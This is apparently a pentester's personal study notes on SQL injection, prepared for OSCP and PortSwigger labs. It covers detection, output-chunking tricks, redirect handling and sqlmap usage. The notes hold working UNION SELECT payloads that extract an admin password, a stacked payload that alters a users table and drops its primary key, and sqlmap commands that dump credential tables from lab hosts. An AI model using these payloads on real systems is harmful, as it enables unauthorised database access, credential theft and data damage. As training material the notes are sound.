<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SQL</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SQL</h1><br/><p><h1>Resources</h1></p><p>[OSCP 62-73 &amp; PortSwigger 58-79]</p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</a></p><p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a> (The <span style="text-decoration:underline;">Conditional Error</span> for <span style="text-decoration:underline;">PostgreSQL</span> is wrong! Instead of <strong>1=</strong>... need to use <strong>AND 1=</strong>...)</p><p></p><p></p><p><h1>Methodology</h1><ul><li><h1>• </h1>• Using whatweb may help you ID the type of DBMS you&#39;re targetting</li></ul></p><p><ul><li>Send baseline Req using <span style="color:#ff0000;">valid values</span> (often required for SQLi), then modify 1 param @ a time with Burp &amp; compare results</li></ul></p><p><ul><li>Diffs may only appear in 1 section of source code. <span style="color:#ff0000;">Edit &amp; check with Burp</span> &amp; don&#39;t rely on modifying site directly &amp; eyeballing it. Viewing Rendered pg with burp can help though </li></ul></p><p><ul><li>Look for <em>error</em> &amp; <em>sql</em> in output, but may not contain those keywords. Diff may only be in Resp length or time</li></ul></p><p><ul><li>Check <span style="color:#ff0000;">custom &amp; default databases</span> (e.g. the default <strong>mysql</strong> DB may contain creds)</li></ul><h1></h1></p><p><h1></h1><h1></h1></p><p><h1></h1><h1>Detection</h1><h1></h1></p><p><h1></h1>[OSCP 64-65 &amp; PortSwigger 76-79]</p><p></p><p>Diff categories of SQLi require diff detection methods (see OSCP)</p><p></p><p>Even if SQLi vuln is detected via <strong>&#39;</strong> or <strong>&quot;</strong> that doesn’t mean payload should start with <strong>&#39;</strong> or <strong>&quot;</strong> . <span style="color:#ff0000;">Sometimes SQLi must be done w/o any quotes in the beginning!</span></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: SQLi can come from different sinks, like <span style="color:#ff0000;">HTTP Headers</span> (e.g. <strong>Cookie</strong>, <strong>User-Agent</strong>, etc). It still needs to be <span style="color:#ff0000;">URL Encoded</span>!<h1></h1></p><p><h1></h1><h1></h1></p><p><h1></h1><h1>IP Restricted Logins</h1><h1></h1></p><p><h1></h1>Even if a DBMS is externally accessible (e.g nmap detected listening port), it may restrict which IPs can be used to login.</p><p></p><p>It could throw a msg like <strong>ERROR 1130 (HY000): Host &#39;192.168.45.217&#39; is not allowed to connect to this MySQL server</strong>.</p><p></p><p>The IP restrictions could prohibit any host not in the internal LAN, or could only allow a specific host to access it (e.g localhost or a specific interface on the host)</p><p></p><p><h2>Bypassing</h2></p><p>If target is a dual-homed host, may also be able to use a tunnel &amp; its internal IP.</p><p></p><p>If host is <span style="color:#ff0000;">restricting some</span> of their own <span style="color:#ff0000;">interfaces</span>, need to <span style="color:#ff0000;">use PF</span> so the Req is literally coming from loopback interface (127.0.0.1). Maybe PF using a different interface if loopback isn&#39;t working for some reason.</p><p><h1></h1></p><p><h1>Schema</h1></p><p>If you can&#39;t find the <strong>information_schema</strong> (or equivilant), there may be an alternate name (e.g for certain versions).</p><p></p><p><h2>MySQL</h2></p><p>Any version could be using<strong> mysql.innodb_table_stats</strong> instead. MySQL didn&#39;t introduce <strong>information_schema</strong> until <em>version 5.0</em></p><p></p><p><h1>Fixing Cutoff Output</h1></p><p>[CTF D 4-8]</p><p></p><p>You can either break the output into chunks &amp; retrieve it using multiple queries, or you can try creating a field which lets you retrieve more data with a single query.</p><p></p><p><h2>Extract Chunks of Output</h2></p><p>Sometimes you can retrieve data (i.e. passwd) via SQLi, but only part of it is output in the Resp. First determine how long the data should be, &amp; what the character limit is for the Resp. For example, using MySQL:</p><p></p><p><em>echo -n “OUTPUT” | wc -m</em>			(Output 16 characters)</p><p></p><p><strong>bob&quot; UNION ALL SELECT NULL,LENGTH(password) FROM web.users WHERE username=&#39;admin&#39;-- //</strong>			(Length is 32 characters)</p><p></p><p><h3>MySQL RIGHT()</h3></p><p>Extract a number of characters from a string starting from the Right (e.g. last 16 characters). Send multiple queries with different chunks of the password to get around output character limit.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: There&#39;s also <strong>LEFT()</strong> in MySQL.</p><p></p><p><strong>bob&quot; UNION ALL SELECT NULL,LEFT(password, 16) FROM web.users WHERE username=&#39;admin&#39;-- //</strong>	</p><p></p><p><strong>bob&quot; UNION ALL SELECT NULL,RIGHT(password, 16) FROM web.users WHERE username=&#39;admin&#39;-- //</strong>	</p><p></p><p><h2>Creating Larger Storage Space</h2></p><p>For example, if you&#39;re retrieving your SQLi output using the <strong>id</strong> Column, but it can only hold 16 characters at a time, you can update that Column so it can hold more characters at once (or add a new, larger Column).</p><p></p><p>You can also change the supported data type to string. You may need to remove the <a href="SQL--DBMS--MySQL_+_MariaDB_17.html#Primary Key Constraint">primary key contraint</a>.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Modifying Tables is <span style="color:#ff0000;">never the 1st choice</span>. It&#39;s bad OPSEC &amp; may cause disruptions for clients. If you use this method, it&#39;s good to have a backup of the OG DB &amp; esnure you revert all changes at the end of the engagement.</p><p></p><p><h3>MySQL Example</h3></p><p><strong>&quot; UNION SELECT 1,2; ALTER TABLE web.users MODIFY id VARCHAR(255); ALTER TABLE web.users DROP PRIMARY KEY;-- //</strong></p><p></p><p><h1>Following Redirections</h1></p><p>Whether or not you should follow redirects depends on the target &amp; the behavior of the injection point. Try both to be safe. If payload works either way, don&#39;t follow the redirect for less Requests (stealthier &amp; faster tests).</p><p></p><p><h2>When to Follow</h2><ul><li>The redirected page is the one that actually processes the vulnerable parameter.</li></ul></p><p><ul><li>The target behavior you&#39;re testing (e.g. delay from a time-based injection) only happens after the redirect.</li></ul></p><p></p><p>•The server is behind a load balancer or WAF that only lets certain logic happen after redirects.</p><p><ul><li>You&#39;re dealing with complex workflows (e.g., SSO, token refreshes, etc.).</li></ul></p><p></p><p><h2>When to Ignore</h2><ul><li>You are certain that the vulnerable code executes before the redirect.</li></ul></p><p><ul><li>The redirect goes to a <span style="color:#ff0000;">generic page</span> (like a login or error page) that doesn&#39;t process the SQL.</li></ul></p><p><ul><li>You want to test just the original response and avoid complications from layered responses.</li></ul></p><p></p><p><h2>Downsides to Following</h2></p><p>These downsides can be more noticable for Blind SQLi.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span> If you ignore the redirect, you might miss post-redirect logic.</p><p></p><p><h3>Masking Injection Effects</h3></p><p>Some redirects may hide SQLi indicators (like error messages or timing differences). For example:</p><p></p><p>You inject SLEEP(5) → vulnerable endpoint redirects → final page doesn&#39;t reflect delay accurately.</p><p></p><p> You lose the timing signal or error feedback because it&#39;s not part of the final response. Errors can contain valuable information, like directories &amp; usernames</p><p> </p><p><h3>Slower Testing</h3></p><p>Redirects introduce additional HTTP requests, making scans significantly slower.</p><p></p><p><h3>False Positives / Negatives</h3></p><p>Following redirects can cause sqlmap to misinterpret results, especially if:</p><p><ul><li>The final page always responds the same (e.g., a generic login page).</li></ul></p><p><ul><li>The response code or content of the redirect masks differences caused by injection.</li></ul></p><p></p><p><h3>Breaking POST Logic</h3></p><p>If the request is a POST, some servers convert it to a GET during redirect. This can break the intended logic or bypass the injection point altogether.</p><p></p><p><h3>Logging Noise / Detection</h3></p><p>More requests = more logs. This can alert intrusion detection systems (IDS) or make your test noisier, especially on production systems.</p><p></p><p><h1>Tips</h1><ul><li>URL-Encoding is often needed. However, encoding special chars (e.g ‘) may change results in some cases? <span style="color:#ff0000;">Don&#39;t Encode quotes?  </span>Burp doesn&#39;t.</li></ul></p><p><ul><li><span style="color:#ff0000;">Sometimes SQLi must be done w/o any quotes in the beginning!</span> (<em>OR 1=1-- // </em>vs<em> &#39; OR 1=1 -- //</em>)</li></ul></p><p><ul><li>If you can trigger an SQL error, you will likely find the Web Root directory.</li></ul></p><p><ul><li>Ending query with <em>;</em> &amp; ending payload with <em>// </em>may/may not do anything, but probably won&#39;t hurt? (e.g <em>OR 1=1;-- // </em>vs<em> OR 1=1--</em>)</li></ul></p><p>	“<span style="color:#ff0000;">Adding // may help protect against Whitespace padding</span>” -Offsec (Try with &amp; w/o)</p><p> <ul><li>Comments vary by DBMS, but -- is standard </li></ul></p><p> <ul><li>May be able to<span style="color:#ff0000;"> find examples of SQLi queries for CVE</span>. For ex,</li></ul></p><p>	PoCs used sqlmap (unsuccessfully), but searched “CVE-2021-24762 example” &amp; found the query @ <a href="https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad/">https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad/</a></p><p>	<ul><li>Creds typically stored as hash &amp; are often salted. Always try to crack them as is</li></ul></p><p><ul><li>A host may have multiple WebApps that use diff SQL DBMS or utilize diff config even if using the same DBMS (e.g MySQL)</li></ul></p><p><ul><li>May be able to update a table to add a new user allowing you to login to webapp, even if you don&#39;t have the privs to write to a file! [OSCP 94-95]</li></ul></p><p><ul><li>If you can find a DB file for the target, you may not even need to do SQLi or it give info that you can use for SQLi. (e.g MySQL has <strong>.sql </strong>files which you can view with <em>less</em>)</li></ul></p><p>	<span style="color:#ff0000;">★The DB file</span> you found <span style="color:#ff0000;">may not be the current version</span> &amp;/or could be <span style="color:#ff0000;">incomplete</span>!</p><p>	<ul><li>You usually don&#39;t need to include <strong>LIMIT 1</strong>, unless it&#39;s a Blind SQLi or you&#39;re Subverting App Logic (i.e.Login Bypass)</li></ul></p><p><ul><li><strong>UNION</strong> removes duplicate entries, but <strong>UNION ALL</strong> doesn&#39;t (which is why it&#39;s used to find # of Columns). <strong>UNION</strong> may help reduce output size.</li></ul></p><p></p><p>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p><p><h1>sqlmap (NOT FOR OSCP!)</h1></p><p>Sqlmap is good if you need to test for unkown SQLi vulns, or Blind SQLi vulns that don&#39;t have a PoC tool designed for them. (May identify XSS which could also be SSTI? Or was that sstimap?)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: <span style="color:#ff0000;">For documented SQLi vulns</span>, it&#39;s often <span style="color:#ff0000;">better to use a PoC tool</span> that was specifically desgined to exploit that. However, manual exploitation is still usually the most reliable method.</p><p></p><p>Sqlmap can be buggy, slow, inaccurate, &amp; it can be hard to read the tables it outputs (but certain data may be saved to a CSV file which you can parse).</p><p></p><p><h2>Issues</h2><ul><li>False Positives/Negatives</li></ul></p><p><ul><li><span style="color:#ff0000;">Mis-identified Table names</span> (causing it to fail when trying to dump the table) &amp;/or missed tables</li></ul></p><p><ul><li>Misleading Error messages. For ex,</li></ul></p><p></p><p>May falsely claim the following. Enter <strong>n</strong> &amp; let it continue-</p><p></p><p><strong>[CRITICAL] page not found (404)</strong><strong></strong></p><p><strong>it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n]</strong></p><p></p><p><h2>List Databases</h2></p><p>1st Scan should retrieve limited amount of info, so you can quickly confirm SQL Vuln &amp; get info that you can use to narrow down subsequent queries. One option is to list all databases.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: After an injection point is found, the next sqlmap scans will use it, so those scans will finish quicker.</p><p></p><p><em>sqlmap -u &quot;http://10.10.106.75/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</em></p><p></p><p><h2>Enumerate Database</h2></p><p>Use <strong>--dump</strong> to dump everything, or use <strong>--tables</strong> to list all tables instead; this lets you limit subsequent queries to relevant tables.</p><p></p><p><em>sqlmap -u &quot;http://10.10.106.75/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbms=MySQL -D joomla --dump -p list[fullordering]</em></p><p></p><p><h3>List Tables</h3></p><p></p><p><em>sqlmap -u &quot;http://10.10.106.75/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbms=MySQL -D joomla --tables -p list[fullordering]</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Enumerate a Table</span>: If sqlmap is unable to determine column names, &amp; prompts you for <strong>common column existence check</strong>, it&#39;ll ask how mnay threads to use (1 by def). May be able to increase this, since it can be VERY slow.</p><p></p><p>For example, Dump the <strong>user</strong> table from <strong>mysql</strong> (may contain creds) &amp; the <strong>#__user</strong> from the <strong>joomla</strong> DB table-</p><p></p><p><em>sqlmap -u &quot;http://10.10.106.75/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbms=MySQL -D mysql -T user --dump -p list[fullordering]</em></p><p></p><p><em>sqlmap -u &quot;http://10.10.106.75/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbms=MySQL -D joomla -T &quot;#__user&quot; --dump -p list[fullordering]</em></p><p></p><p><h3>List Columns</h3></p><p>List columns with <strong>--columns</strong>. You can query 1+ specific columns with <strong>-C</strong></p><p></p><p><em>sqlmap -u &quot;http://pathfinderhotel.com:12340/rms/delete-order.php?id=1&quot; -D dbrms -T users --columns</em><em></em></p><p><em></em><em></em></p><p><em>sqlmap -u &quot;http://pathfinderhotel.com:12340/rms/delete-order.php?id=1&quot; -D dbrms --dbms=MySQL -T users -C password,email --answers=&quot;follow=N&quot;</em></p><p></p><p><h2>Extract 1 Value per Line from CSV File</h2></p><p>For example, if <strong>sqlmap</strong> output data from a table with 3 columns (id, username, password), there&#39;s 1 row per line in the CSV. Extract usernames with-</p><p></p><p><em>awk -F &quot;,&quot; &#39;{print $2}&#39; /home/asura/.local/share/sqlmap/output/10.10.106.75/dump/ex_DB/user.csv &gt;&gt; usernames.txt</em></p><p></p><p><h2>Manually Run SQL Queries</h2></p><p>Run SqlMap with <strong>--sql-shell</strong> arg. It makes it easy to run follow up commands, but it&#39;s not fun for Blind SQLi.</p><p></p><p><h1>sqlninja (MSSQL)</h1></p></div>
</body>
</html>
